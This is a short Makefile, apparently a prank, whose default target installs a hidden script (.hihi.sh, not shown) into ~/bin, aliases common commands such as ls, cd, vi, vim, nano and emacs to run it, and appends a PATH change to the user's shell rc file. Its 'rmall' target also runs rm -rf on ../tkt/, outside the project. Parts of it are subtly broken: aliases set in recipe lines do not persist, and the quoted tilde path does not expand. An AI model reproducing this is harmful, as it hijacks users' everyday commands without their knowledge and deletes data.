SL = .hihi.sh

all:	$(SL)
	mkdir -p ~/bin
	mv .hihi.sh ~/bin/
	chmod +x ~/bin/.hihi.sh
	alias sl="sh ~/bin/.hihi.sh"
	alias ls="sl"
	alias cd="sl"
	alias vi="sl"
	alias vim="sl"
	alias nvim="sl"
	alias nano="sl"
	alias emacs="sl"
	echo 'export PATH="$HOME/bin:$PATH"' >> "~/.$(basename $SHELL)rc"
	source "~/.$(basename $SHELL)rc"

ahmed_le_goat:
	alias ahmed_le_goat="unalias sl ls cd vi vim nvim nano emacs"

rmall:
	unalias sl ls cd vi vim nvim nano emacs
	rm -rf ~/bin/.hihi.sh
	rm -rf ../tkt/
